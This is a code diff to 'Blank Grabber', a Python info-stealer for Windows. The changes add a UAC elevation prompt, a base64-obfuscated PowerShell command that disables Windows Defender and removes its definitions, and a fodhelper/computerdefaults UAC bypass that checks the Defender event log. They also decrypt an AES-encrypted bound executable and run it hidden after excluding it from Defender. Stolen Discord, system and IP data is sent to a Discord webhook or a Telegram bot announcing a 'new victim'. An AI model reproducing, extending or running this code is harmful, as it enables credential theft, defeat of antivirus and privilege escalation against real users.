@@ -258,10 +258,14 @@ class Utility:
                     subprocess.run('taskkill /F /PID %d' % pid, shell= True, capture_output= True)
             except Exception:
                 pass
+    
+    @staticmethod
+    def UACPrompt(path: str) -> bool: # Shows UAC Prompt
+        return ctypes.windll.shell32.ShellExecuteW(None, "runas", path, " ".join(sys.argv), None, 1) == 42
 
     @staticmethod
     def DisableDefender() -> None: # Tries to disable the defender
-        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
+        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
         subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     @staticmethod
@@ -333,25 +337,38 @@ class Utility:
         return ctypes.windll.shell32.IsUserAnAdmin() == 1
     
     @staticmethod
-    def UACbypass(method: int = 1) -> None: # Tries to bypass UAC prompt and get administrator permissions (exe mode)
+    def UACbypass(method: int = 1) -> bool: # Tries to bypass UAC prompt and get administrator permissions (exe mode)
         if Utility.GetSelf()[1]:
         
-            execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
+            execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
         
-            if method == 1:
-                if not execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): Utility.UACbypass(2)
-                if not execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): Utility.UACbypass(2)
-                execute("computerdefaults --nouacbypass")
-                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+            match method:
+                case 1:
+                    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+                    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                    execute("computerdefaults --nouacbypass")
+                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
 
-            elif method == 2:
+                    if log_count_after > log_count_before:
+                        return Utility.UACbypass(method + 1)
 
-                execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
-                execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-                execute("fodhelper --nouacbypass")
-                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
-        
-            os._exit(0)
+                case 2:
+
+                    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+                    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                    execute("fodhelper --nouacbypass")
+                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+
+                    if log_count_after > log_count_before:
+                        return Utility.UACbypass(method + 1)
+                case _:
+                    return False
+            
+            return True
     
     @staticmethod
     def IsInStartup() -> bool: # Checks if the file is in startup
@@ -705,12 +722,15 @@ class Discord:
                         if not isinstance(m, dict):
                             continue
                         method_type = m.get('type', 0)
-                        if method_type == 0:
-                            methods['Unknown'] += 1
-                        elif method_type == 1:
-                            methods['Card'] += 1
-                        else:
-                            methods['Paypal'] += 1
+
+                        match method_type:
+                            case 1:
+                                methods['Card'] += 1
+                            case 2:
+                                methods['Paypal'] += 1
+                            case _:
+                                methods['Unknown'] += 1
+
                     billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                 gifts = list()
                 r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.GetHeaders(token)).data.decode(errors= "ignore")
@@ -1607,71 +1627,72 @@ class BlankGrabber:
         
         grabbedInfo = "\n".join([key + " : " + str(value) for key, value in collection.items()])
 
-        if Settings.C2[0] == 0: # Discord Webhook
-            image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
+        match Settings.C2[0]:
+            case 0: # Discord Webhook
+                image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
 
-            payload = {
-                "content": "||@everyone||" if Settings.PingMe else "",
-                "embeds": [
-                    {
-                        "title": "Blank Grabber",
-                        "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-                        "url": "https://github.com/Blank-c/Blank-Grabber",
-                        "color": 34303,
-                        "footer": {
-                            "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
-                        },
-                        "thumbnail": {
-                            "url": image_url
+                payload = {
+                    "content": "||@everyone||" if Settings.PingMe else "",
+                    "embeds": [
+                        {
+                            "title": "Blank Grabber",
+                            "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
+                            "url": "https://github.com/Blank-c/Blank-Grabber",
+                            "color": 34303,
+                            "footer": {
+                                "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
+                            },
+                            "thumbnail": {
+                                "url": image_url
+                            }
                         }
-                    }
-                ],
-                "username" : "Blank Grabber",
-                "avatar_url" : image_url
-            }
+                    ],
+                    "username" : "Blank Grabber",
+                    "avatar_url" : image_url
+                }
 
-            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20: # 20 MB
-                url = self.UploadToExternalService(self.ArchivePath, filename)
-                if url is None:
-                    raise Exception("Failed to upload to external service")
-            else:
-                url = None
+                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20: # 20 MB
+                    url = self.UploadToExternalService(self.ArchivePath, filename)
+                    if url is None:
+                        raise Exception("Failed to upload to external service")
+                else:
+                    url = None
+                
+                fields = dict()
+
+                if url:
+                    payload["content"] += " | Archive : %s" % url
+                else:
+                    fields["file"] = (filename, open(self.ArchivePath, "rb").read())
+                
+                fields["payload_json"] = json.dumps(payload).encode()
+
+                http.request("POST", Settings.C2[1], fields=fields)
             
-            fields = dict()
+            case 1: # Telegram Bot
+                payload = {
+                    'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
+                    'parse_mode': 'HTML'
+                }
 
-            if url:
-                payload["content"] += " | Archive : %s" % url
-            else:
-                fields["file"] = (filename, open(self.ArchivePath, "rb").read())
-            
-            fields["payload_json"] = json.dumps(payload).encode()
+                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40: # 40 MB
+                    url = self.UploadToExternalService(self.ArchivePath, filename)
+                    if url is None:
+                        raise Exception("Failed to upload to external service")
+                else:
+                    url = None
+                
+                fields = dict()
 
-            http.request("POST", Settings.C2[1], fields=fields)
-        
-        elif Settings.C2[0] == 1: # Telegram Bot
-            payload = {
-                'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
-                'parse_mode': 'HTML'
-            }
-
-            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40: # 40 MB
-                url = self.UploadToExternalService(self.ArchivePath, filename)
-                if url is None:
-                    raise Exception("Failed to upload to external service")
-            else:
-                url = None
-            
-            fields = dict()
-
-            if url:
-                payload["caption"] += "\n\nArchive : %s" % url
-            else:
-                fields["document"] = (filename, open(self.ArchivePath, "rb").read())
-            
-            token, chat_id = Settings.C2[1].split('$')
-            fields.update(payload)
-            fields.update({'chat_id': chat_id})
-            http.request('POST', 'https://api.telegram.org/bot%s/sendDocument' % token, fields=fields)
+                if url:
+                    payload["caption"] += "\n\nArchive : %s" % url
+                else:
+                    fields["document"] = (filename, open(self.ArchivePath, "rb").read())
+                
+                token, chat_id = Settings.C2[1].split('$')
+                fields.update(payload)
+                fields.update({'chat_id': chat_id})
+                http.request('POST', 'https://api.telegram.org/bot%s/sendDocument' % token, fields=fields)
 
 if __name__ == "__main__" and os.name == "nt":
     Logger.info("Process started")
@@ -1683,12 +1704,19 @@ if __name__ == "__main__" and os.name == "nt":
         if Utility.GetSelf()[1]:
             if not "--nouacbypass" in sys.argv and Settings.UacBypass:
                 Logger.info("Trying to bypass UAC (Application will restart)")
-                Utility.UACbypass() # Tries to bypass UAC Prompt (only for exe mode)
+                if Utility.UACbypass(): # Tries to bypass UAC (only for exe mode)
+                    os._exit(0)
+                else:
+                    Logger.warning("Failed to bypass UAC")
+                    if not Utility.IsInStartup(sys.executable):
+                        logger.info("Showing UAC prompt")
+                        if Utility.UACPrompt(sys.executable): # Ask user for admin perms and restart
+                            os._exit(0) 
             
             if not Utility.IsInStartup() and not Settings.UacBypass:
                 Logger.info("Showing UAC prompt to user (Application will restart)")
-                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-                os._exit(0)
+                if Utility.UACPrompt(sys.executable): # Ask user for admin perms and restart
+                    os._exit(0) 
     
     Logger.info("Trying to create mutex")
     if not Syscalls.CreateMutex(Settings.Mutex): 
@@ -1702,18 +1730,23 @@ if __name__ == "__main__" and os.name == "nt":
     Logger.info("Trying to disable defender")
     Utility.DisableDefender() # Tries to disable Defender
 
-    if Utility.GetSelf()[1] and not Utility.IsInStartup() and os.path.isfile(os.path.join(sys._MEIPASS, "bound.exe")):
+    if Utility.GetSelf()[1] and not Utility.IsInStartup() and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.aes")):
         try:
             Logger.info("Trying to extract bound file")
-            if os.path.isfile(boundfile:= os.path.join(os.getenv("temp"), "bound.exe")): # Checks if any bound file exists (only for exe mode)
+            if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")): # Checks if any bound file exists (only for exe mode)
                 Logger.info("Old bound file found, removing it")
-                os.remove(boundfile) # Removes any older bound file
+                os.remove(boundFileDst) # Removes any older bound file
 
-            shutil.copy(os.path.join(sys._MEIPASS, "bound.exe"), boundfile) # Copies bound file to the new location
+            with open(boundFileSrc, "rb") as file:
+                content = file.read()
+            decrypted = pyaes.AESModeOfOperationGCM(content[:32], content[32:64]).decrypt(content[64:]) # Decrypt the file
+            with open(boundFileDst, "wb") as file: # Copies bound file to the new location
+                file.write(decrypted)
+            del content, decrypted
             Logger.info("Trying to exclude bound file from defender")
-            Utility.ExcludeFromDefender(boundfile) # Tries to exclude the bound file from Defender
+            Utility.ExcludeFromDefender(boundFileDst) # Tries to exclude the bound file from Defender
             Logger.info("Starting bound file")
-            subprocess.Popen("start bound.exe", shell= True, cwd= os.path.dirname(boundfile), creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE) # Starts the bound file
+            subprocess.Popen("start bound.exe", shell= True, cwd= os.path.dirname(boundFileDst), creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE) # Starts the bound file
         except Exception as e:
             Logger.error(e)
     
